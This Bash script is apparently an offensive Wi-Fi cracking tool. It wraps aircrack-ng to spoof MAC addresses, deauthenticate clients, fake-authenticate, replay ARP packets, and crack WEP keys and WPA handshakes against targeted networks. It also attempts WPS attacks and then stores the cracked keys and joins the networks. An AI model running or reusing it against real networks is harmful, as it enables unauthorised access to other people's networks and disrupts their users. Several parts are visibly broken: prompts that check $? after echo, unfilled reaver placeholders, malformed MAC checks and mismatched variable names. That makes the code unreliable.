#!/usr/bin/env bash

# by Lee Baird (@discoverscripts) & Jason Arnold

trap f_clean EXIT

##############################################################################################################

# Global variables
DATESTAMP=$(date +%F_%T)
MEDIUM='=================================================================='
RESOLUTION=$(xdpyinfo | grep 'dimensions' | awk '{print $2}' | awk -F"x" '{print $1}')
WORKDIR="$HOME/wifi-keys"

BLUE='\033[1;34m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

##############################################################################################################

# Check for dependencies
if ! command -v xterm &> /dev/null; then
    echo
    echo "[!] xterm is not installed."
    echo
    exit 1
fi

##############################################################################################################

f_banner(){
echo
echo -e "${YELLOW}
 ___  ___  __   ___ _  _             ___
|    |__/ |__| |    |_/     | | |   |__
|___ |  \ |  | |___ | \_    |_|_| | |   |

by Lee Baird & Jason Arnold${NC}"
echo
echo
}

##############################################################################################################

f_start(){
f_banner

# Detect wireless interface
INTERFACE=$(iw dev | grep Interface | awk '{print $2}')

if [ -z "$INTERFACE" ]; then
    echo
    echo "[!] No wireless device found."
    echo
    echo "If you are using a VM, make sure your USB card is enabled."
    echo
    exit 1
fi

echo -e "${BLUE}[*] Setting variables.${NC}"

DRIVER=$(airmon-ng | grep "$INTERFACE" | awk '{print $3}')

# Enable monitor mode
airmon-ng start "$INTERFACE" &>/dev/null

# Get monitor interface
MONITOR=$(iwconfig 2>/dev/null | grep -o '^[^ ]*mon' | head -n 1)

if [ -z "$MONITOR" ]; then
    echo
    echo "[!] Failed to enable monitor mode. Check your wireless card."
    echo
    exit 1
fi

echo -e "${BLUE}[*] Monitor mode enabled on $MONITOR.${NC}"

# Check for injection capability
echo
echo -e "${BLUE}[*] Performing test to validate injection is working on $MONITOR.${NC}"
aireplay-ng -9 "$MONITOR" > tmp
sleep 3

if grep -q 'Injection is working!' tmp; then
    rm tmp 2>/dev/null
else
    rm tmp 2>/dev/null
    echo
    echo "[!] Injection is not working. Reconnect your wireless card and try again."
    echo
    exit 1
fi

f_menu
}

############################################### NEED TO REWORK ###############################################

# Check working directory
if [ ! -d "$WORKDIR" ]; then
    mkdir -p "$WORKDIR"
fi

# Generate $WORKDIR/keys file
if [ -f "$WORKDIR/keys" ]; then
    echo
    DELIMETERTEST=$(grep '\^' "$WORKDIR/keys")

    if [ -z "$DELIMETERTEST" ]; then
        echo "Your $WORKDIR/keys file is out of date. You need to open it in a text editor and replace all appropriate spaces with ^ symbols."
        echo "The lines in the file should look like below when this has been done correctly. Do this for all the lines."
        echo
        echo "No^Network^Ch^Password^Encryption^IVs^Notes"
        echo "1^WIFINET^8^passphrase1^WPA^n/a^First network passphrase guessed"
        echo "2^WIFI NET^5^passphrase2^WPA^n/a^Note that this ESSID has a space in the name"
        echo
        echo "Make these changes, then re-launch the program."
        echo
        exit 1
    fi

else
    echo "No^Network^Ch^Password^Encryption^IVs^Notes" > "$WORKDIR/keys"
fi

# Generate .editor config file
if [ -f .editor ]; then
    EDITOR=$(cat .editor)
else
    echo "What is your default text editor?" --cancel-label=vi --ok-label=gedit

    if [ $? = 0 ]; then
        EDITOR="gedit"
        echo gedit > .editor
    else
        EDITOR="vi"
        echo vi > .editor
    fi
fi

##############################################################################################################

f_menu(){
f_banner

echo -e "${BLUE}Interface: $INTERFACE  Monitor: $MONITOR  Module: $DRIVER${NC}"
echo
echo "1.  Scan for WEP and WPA networks"
echo "2.  Scan for WPS networks - TESTING"
echo "3.  Crack WEP networks"
echo "4.  Crack WPA networks"
echo "5.  Keys - view/edit Key file or join a network"
echo "6.  Exit"
echo
echo -n "Choice: "
read -r CHOICE

case "$CHOICE" in
    1) f_scan ;;
    2) f_scanWPS ;;
    3) f_crackWEP ;;
    4) f_crackWPA ;;
    5) f_keys ;;
    6)
    airmon-ng stop "$MONITOR" &>/dev/null
    killall -q wpa_supplicant
    killall -q dhclient
    ifconfig "$INTERFACE" down
    f_clean
    echo && echo && exit ;;
    *) echo; echo -e "${RED}[!] Invalid choice or entry, try again.${NC}"; echo; sleep 2; f_menu ;;
esac
}

##############################################################################################################

f_clean(){
airmon-ng stop "$INTERFACE"
rm *.cap 2>/dev/null
rm *.csv 2>/dev/null
rm *.netxml 2>/dev/null
rm "$WORKDIR"/keys~ 2>/dev/null
rm /var/run/wpa_supplicant/wlan0 2>/dev/null
rm /var/run/wpa_supplicant/wlan1 2>/dev/null
rm tmp 2>/dev/null
}

##############################################################################################################

f_error(){
echo
echo -e "${RED}$MEDIUM${NC}"
echo
echo -e "${RED}[!] Invalid choice.${NC}"
echo
echo -e "${RED}$MEDIUM${NC}"
sleep 2
f_menu
}

##############################################################################################################

f_keys(){
clear
column -s ^ -t "$WORKDIR"/keys

ZZ=$(zenity --list --column "Cracked Networks" --text "" "Edit file" "Join a network")

if [[ "$ZZ" = "Edit file" ]]; then
    $EDITOR "$WORKDIR"/keys
    f_menu
elif [[ "$ZZ" =  "Join a network" ]]; then
    NUMBER=$(zenity --entry --text "Enter the number of the network you wish to join:")
    let line="$NUMBER"+1
    head -n "$line" "$WORKDIR"/keys | tail -n 1 > tmp
    X=$(awk -F"^" '{print $2}' tmp)
    Y=$(awk -F"^" '{print $4}' tmp)
    Z=$(awk -F"^" '{print $5}' tmp)
    echo
    echo "$MEDIUM"
    echo

    if [ "$Z" = "WPA" ]; then
        # WPA join code goes here
        WPAKEY=$(wpa_passphrase "$X" "$Y" | grep 'psk' | grep -v '#psk' | awk -F"=" '{print $2}')
        WPASUPP=/tmp/wpa_supplicant.conf
        # Create /tmp/wpa_supplicant.conf file
        echo "" > "$WPASUPP"
        echo "ctrl_interface=/var/run/wpa_supplicant" >> "$WPASUPP"
        echo "" >> "$WPASUPP"
        echo "network={" >> "$WPASUPP"
        echo "   ssid=\"$X\"" >> "$WPASUPP"
        echo "   scan_ssid=1" >> "$WPASUPP"
        echo "   proto=WPA RSN" >> "$WPASUPP"
        echo "   key_mgmt=WPA-PSK" >> "$WPASUPP"
        echo "   pairwise=CCMP TKIP" >> "$WPASUPP"
        echo "   group=CCMP TKIP" >> "$WPASUPP"
        echo "   psk=$WPAKEY" >> "$WPASUPP"
        echo "}" >> "$WPASUPP"

        wpa_supplicant -B -i"$INTERFACE" -Dwext -c"$WPASUPP"
        sleep 2
        dhclient "$INTERFACE"
        sleep 2

        echo
        echo "Now connected to the wireless network \"$X\"."
        echo
        echo -n "When ready to disconnect, type EXIT and press <return> to continue: "
        read -r DISC

        if [ "$DISC" = "EXIT" ]; then
            killall -q wpa_supplicant
            killall -q dhclient
            ifconfig "$INTERFACE" down
            sleep 5
            f_menu
        else
            f_error
        fi
    elif [ "$Z" = "WEP" ]; then
        # WEP join code goes here
        airmon-ng stop "$MONITOR" &>/dev/null
        ifconfig "$INTERFACE" down
        iwconfig "$INTERFACE" essid "$X" key "$Y"
        ifconfig "$INTERFACE" up
        sleep 1
        dhclient "$INTERFACE"
        echo
        echo "Now connected to the wireless network \"$X\"."
        echo
        echo -n "When ready to disconnect, type EXIT and press <return> to continue: "
        read -r DISC

        if [ "$DISC" = "EXIT" ]; then
            killall -q dhclient
            ifconfig "$INTERFACE" down
            sleep 3
            f_menu
        else
            f_menu
        fi
    fi
fi
}

##############################################################################################################

f_options(){
echo
echo "$MEDIUM"
echo
echo "Enter the options for your attack."
echo
echo -n "ESSID:    "
read -r ESSID

# Check for no answer
if [ -z "$ESSID" ]; then
    f_error
fi

if grep -q "$ESSID" "$WORKDIR"/keys; then
    echo
    echo "[*] This network has already been cracked."
    f_menu
fi

echo -n "Channel:  "
read -r CHANNEL

# Check for no answer
if [ -z "$CHANNEL" ]; then
    f_error
fi

f_validChannel "$CHANNEL"

# Check for no answer
if [ -z "$CHANNEL" ]; then
    f_error
fi

echo -n "BSSID:    "
read -r BSSID

# Check for no answer
if [ -z "$BSSID" ]; then
    f_error
fi

# Check for a valid MAC address
if f_validMAC ! "$BSSID"; then
    printf "Sorry, %s is not a valid MAC address\n" "$BSSID" >&2
    read -p "Press <return> to continue."
    f_crackWEP
fi
}

##############################################################################################################

f_return(){
read -p "Press <return> to continue."

f_menu
}

##############################################################################################################

f_spoof(){
echo
echo "$MEDIUM"
echo
echo -e "${BLUE}[*] Spoofing MAC address.${NC}"
echo

ifconfig "$MONITOR" down
macchanger -r "$MONITOR"
ifconfig "$MONITOR" up

fakeMAC=$(macchanger -s "$MONITOR" | awk '{print $3}')

echo
echo "$MEDIUM"
echo
}

##############################################################################################################

f_validChannel(){
    if [[ "$1" -lt 1 || "$1" -gt 11 ]]; then
        f_error
    fi
}

##############################################################################################################

f_validMAC(){
ERROR=0
OLDIFS=$IFS
IFS=:
set -f
set -- "$1"

if [ $# -eq 6 ]; then
    for SEG; do
        case "$SEG" in
            ""|*[!0-9a-fA-F]*)
            ERROR=1
            break
            ;; # Segment empty or non-hexadecimal
            ??)
            ;; # Segment with 2 caracters are ok
            *)
            ERROR=1
            break
            ;;
        esac
    done
else
     ERROR=2 ## Not 6 segments
fi

IFS="$OLDIFS"
set +f

return "$ERROR"
}

##############################################################################################################

f_scan(){
echo
echo "$MEDIUM"
echo
echo -e "${YELLOW}Once scanning begins, press ctl+c to exit and return to main menu.${NC}"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel 1-11: "
read -r CHANNEL

f_validChannel "$CHANNEL"

# Optimized for 17 inch MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)
# Need to optimize for 15 inch MacBook Pro (2880×1800)
if [ "$RESOLUTION" -ge "1900" ]; then
    if [ -z "$CHANNEL" ]; then
        xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -T WEP -e airodump-ng --encrypt wep "$MONITOR" --output-format pcap &
        sleep 1
        xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -T WPA -e airodump-ng --encrypt wpa "$MONITOR" --output-format pcap &
        f_menu
    else
        xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -T WEP -e airodump-ng --channel "$CHANNEL" --encrypt wep "$MONITOR" --output-format pcap &
        sleep 1
        xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -T WPA -e airodump-ng --channel "$CHANNEL" --encrypt wpa "$MONITOR" --output-format pcap &
        f_menu
    fi
else
    if [ -z "$CHANNEL" ]; then
        xterm -bg blue -fg white -geometry 125x25+0+10 -T WEP -e airodump-ng --encrypt wep "$MONITOR" &
        sleep 1
        xterm -bg blue -fg white -geometry 125x25+0+425 -T WPA -e airodump-ng --encrypt wpa "$MONITOR" &
        f_menu
    else
        xterm -bg blue -fg white -geometry 125x25+0+10 -T WEP -e airodump-ng --channel "$CHANNEL" --encrypt wep "$MONITOR" &
        sleep 1
        xterm -bg blue -fg white -geometry 125x25+0+425 -T WPA -e airodump-ng --channel "$CHANNEL" --encrypt wpa "$MONITOR" &
        f_menu
    fi
fi
}

##############################################################################################################

f_scanWPS(){
echo
echo "$MEDIUM"
echo
echo -e "${YELLOW}[*] Run until you find a target network, then press ctl+c.${NC}"
echo

# Change the geometry as needed (width x height + x + y)
xterm -bg blue -fg white -fn 10x20 -geometry 110x60+0+0 -T WPS -e wash -i "$MONITOR" -C &

f_options

reaver -i "$MONITOR" -b <BSSID> -e <ESSID> -f -c <channel> -a -vv
}

##############################################################################################################

f_crackWEP(){
f_validMAC
f_clean
f_spoof

echo -e "${YELLOW}[*] Let airodump-ng run until you find a target network, then press ctl+c.${NC}"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel 1-11: "
read -r CHANNEL

f_validChannel "$CHANNEL"

if [ -z "$CHANNEL" ]; then
    airodump-ng --encrypt WEP "$MONITOR"
else
    airodump-ng --channel "$CHANNEL" --encrypt WEP "$MONITOR"
fi

echo "Is the network you want to attack hidden?"

if [ $? = 0 ]; then
    A=$(zenity --entry --text "BSSID of target")
    E=$(zenity --entry --text "STATION MAC currently connected")

    echo "Enter a channel that the hidden network is running on."
    echo -n "Channel 1-11: "
    read -r CHANNEL
    f_validChannel "$CHANNEL"

    xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c "$CHANNEL" --bssid "$A" -w output "$MONITOR" &
    xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+300 -hold -e aireplay-ng -0 30 -a "$A" -c "$E" "$MONITOR" &
fi

f_options

echo "Spoofed MAC address is $fakeMAC if no Stations have associated yet."
echo -n "STATION:  "
read -r STATION

# Check for no answer
if [ -z "$STATION" ]; then
    f_error
fi

# Check for a valid MAC address
if f_validMAC ! "$STATION"; then
    printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
    read -p "Press <return> to continue."
    f_crackWEP
fi

# Optimized for 17 inch MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)

if [ "$CHANNEL" = "?" ]; then
    xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+308 -hold -T "Deauthentication" -e aireplay-ng --deauth 10 -a "$BSSID" -c "$STATION" "$MONITOR" &
    echo -n "ESSID: "
    read -r ESSID
    killall xterm 2>/dev/null
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w output "$MONITOR" &
sleep 5
xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+335 -hold -T "Fake Authentication" -e aireplay-ng --fakeauth 0 -e "$ESSID" -a "$BSSID" -h "$fakeMAC" "$MONITOR" &
sleep 20

echo "Has association been successful?"

if [ $? = 1 ]; then
    echo "MAC address filtering may be enabled."
    killall xterm 2>/dev/null
    f_menu
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x6+965+545 -hold -T "ARP Replay" -e aireplay-ng --arpreplay -b "$BSSID" -h "$fakeMAC" "$MONITOR" &
sleep 30

echo "Look in the airodump-ng window. Is the value for #Data increasing?"

if [ $? = 1 ]; then
    killall xterm 2>/dev/null
    f_menu
fi

sleep 60

aircrack-ng -a 1 *.cap

pkill -9 xterm 2>/dev/null               # BUG - this is not working.  Still seeing output on the screen

echo "Your results will be saved to a file."
echo
echo "ESSID:   " "$ESSID"
echo "Channel: " "$CHANNEL"
unset KEY
echo -n "KEY:      " "$KEY"
read -r KEY
KEY=$(echo "$KEY" | sed 's/://g')
echo -n "IVs:      " "$IVs"
read -r IVs
unset Notes
echo -n "Notes:    " "$Notes"
read -r Notes

NO=$(wc -l "$WORKDIR"/keys | awk '{print $1}')

echo "$NO^$ESSID^$CHANNEL^$KEY^WEP^$IVs^$Notes" >> "$WORKDIR"/keys

f_connect
}

##############################################################################################################

f_connect(){
echo
echo -n "Would you like to connect to the wireless network? y/n  "
read -r 1 CONNECT

if [ "$CONNECT" == y ]; then
    killall xterm 2>/dev/null
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" essid "$ESSID" key "$KEY"
    ifconfig "$INTERFACE" up
    sleep 1
    dhclient "$INTERFACE"
    echo
    echo "Now connected to the new wireless network."
    f_menu
else
    killall xterm 2>/dev/null
    f_menu
fi
}

f_crackWPA(){
f_validMAC
f_clean
f_spoof

echo -e "${YELLOW}[*] Let airodump-ng run until you find a target network, then press ctl+c.${NC}"
echo
echo "Enter a channel or press <return> for all."
echo -n "Channel (1-11): "
read -r CHANNEL

f_validChannel "$CHANNEL"

if [ -z "$CHANNEL" ]; then
     airodump-ng --encrypt WPA "$MONITOR"
else
     airodump-ng --channel "$CHANNEL" --encrypt WPA "$MONITOR"
fi

echo "Is the network you want to attack hidden (non-broadcasted SSID)?"

if [ $? = 0 ]; then
    a=$(zenity --entry --text BSSID)
    e=$(zenity --entry --text STATION)
    xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e aireplay-ng -0 10 -a "$A" -c "$E" "$MONITOR" &
fi

f_options

echo -n "STATION:  "
read -r STATION

# Check for no answer
if [ -z "$STATION" ]; then
    f_error
fi

# Check for a valid MAC address
if f_validMAC ! "$STATION"; then
    printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
    read -p "Press <return> to continue."
    f_crackWPA
fi

xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w output "$MONITOR" &
# Insert aireplay code here for hidden networks
sleep 10
xterm -bg blue -fg white -fn 10x20 -geometry 94x12+965+345 -hold -T "Deauthentication" -e aireplay-ng --deauth 10 -a "$BSSID" -c "$STATION" "$MONITOR" &
sleep 30

echo "Look in the airodump-ng window. Has a WPA handshake occured? If not, continue to wait. If so, click Yes."

if [ $? = 0 ]; then
    echo "Would you like to store the capture file containing the handshake for later attack?"

    if [ $? = 0 ]; then
        killall xterm 2>/dev/null
        FIXEDESSID=$(echo "$ESSID" | sed 's/ /\\ /')

        if [ ! -d "$WORKDIR/$DATESTAMP/$FIXEDESSID" ]; then
            mkdir -p "$WORKDIR/$DATESTAMP/$FIXEDESSID"
        fi

        cp output* "$WORKDIR/$DATESTAMP/$FIXEDESSID"
        echo "Capture file(s) saved in $WORKDIR/$DATESTAMP/$FIXEDESSID"
        echo "Would you like to save the capture file(s) to the desktop as well?"

        if [ $? = 0 ]; then
            cp output* ~/Desktop
        fi

        read -p "Press <return> to continue."
        f_menu
    fi

    echo "Select a wordlist."
    WORDLIST=$(zenity --file-selection --filename=/usr/share/wordlists/rockyou.txt)

    killall xterm 2>/dev/null

    aircrack-ng -a 2 --bssid "$BSSID" *.cap -w "$WORDLIST"

    echo "Your results will be saved to a file."
    echo
    echo "ESSID:   " "$ESSID"
    echo "Channel: " "$CHANNEL"
    unset KEY
    echo -n "KEY:      " "$KEY"
    read -r KEY
    unset Notes
    echo -n "Notes:    " "$Notes"
    read -r Notes

    NUMBER=$(wc -l "$WORKDIR"/keys | awk '{print $1}')

    # Reference: No Network Ch Password Encryption IVs Notes > $WORKDIR/keys
    echo "$NUMBER^$ESSID^$CHANNEL^$KEY^WPA^n/a^$Notes" >> "$WORKDIR"/keys
    f_return
else
    killall xterm 2>/dev/null
    f_return
fi
}

##############################################################################################################

f_start
